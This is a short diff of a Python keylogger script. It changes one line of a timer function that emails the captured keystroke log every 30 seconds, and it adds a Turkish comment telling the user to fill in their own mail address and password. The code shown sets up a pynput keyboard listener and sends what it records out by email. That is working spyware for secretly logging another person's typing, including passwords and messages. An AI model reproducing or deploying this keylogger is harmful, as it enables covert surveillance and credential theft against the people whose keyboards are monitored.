@@ -30,7 +30,7 @@ def send_email(email,password,message):
 
 def thread_function():
     global log
-    send_email("email", "password", log.encode('utf-8'))
+    send_email("mail", "password", log.encode('utf-8')) #Mailini ve şifreni gir 
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
@@ -39,4 +39,3 @@ keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
     thread_function()
     keylogger_listener.join()
-
